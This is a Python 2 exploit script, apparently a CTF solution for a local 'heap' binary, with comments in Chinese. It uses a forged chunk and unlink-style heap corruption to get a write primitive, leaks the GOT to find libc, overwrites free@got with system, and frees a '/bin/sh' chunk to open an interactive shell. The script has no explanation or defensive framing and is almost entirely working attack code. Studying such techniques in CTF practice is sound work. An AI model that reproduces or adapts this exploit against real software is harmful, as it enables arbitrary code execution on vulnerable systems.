#! /usr/bin/python
#coding:utf-8
from zio import *

io = zio('./heap')
libc_free = 0x000760c0
libc_sys = 0x0003fcd0

# 申请第一块内存
io.readline()
io.writeline('m')
io.readline()
io.readline()
io.writeline('504')
io.readline()
io.writeline('aaa')
io.readline()

# 申请第二块内存
io.readline()
io.writeline('m')
io.readline()
io.readline()
io.writeline('512')
io.readline()
io.writeline('aaa')
io.readline()

# 释放chunk0
io.readline()
io.writeline('f')
io.readline()
io.writeline('0')
io.readline()

# 释放chunk1
io.readline()
io.writeline('f')
io.readline()
io.writeline('1')
io.readline()

# 关键payload，申请一块更大的chunk
io.readline()
io.writeline('m')
io.readline()
io.readline()
io.writeline('768')
io.readline()
io.writeline(l32(0x00000000)  + l32(0x000001f9) + l32(0x0804bfa0 - 0xc) + l32(0x0804bfa0 - 0x8) + 'a'*(0x200-24) + l32(0x000001f8) + l32(0x00000108))
io.readline()

# 修改got表中的free后。free这个chunk就可以拿shell了
io.readline()
io.writeline('m')
io.readline()
io.readline()
io.writeline('20')
io.readline()
io.writeline('/bin/sh')
io.readline()

io.readline()
io.writeline('f')
io.readline()
io.writeline('1')
io.readline()


io.readline()
io.writeline('e')
io.readline()
io.writeline('0')
io.writeline('a'*12 + l32(0x0804A014)) # free@got
io.readline()

# leak got
io.readline()
io.writeline('p')
io.readline()
io.writeline('0')

# 把整个got表leak了出来，待会全部还原回去
free_addr = l32(io.read(4))
getchar = l32(io.read(4))
#stack_chk_fail = l32(io.read(4))
malloc = l32(io.read(4))
puts = l32(io.read(4))
gmon_start__  = l32(io.read(4))
libc_start_main = l32(io.read(4))
isoc99_scanf = l32(io.read(4))

io.readline()


io.readline()
base_addr = free_addr - libc_free
sys_addr = base_addr + libc_sys
print hex(sys_addr)

io.writeline('e')
io.readline()

io.writeline('0')
io.writeline(l32(sys_addr) + l32(getchar) + l32(malloc) + l32(puts) + l32(gmon_start__) + l32(libc_start_main) + l32(isoc99_scanf))
io.readline()
io.readline()

io.writeline('f')
io.readline()
io.writeline('3')

io.interact()
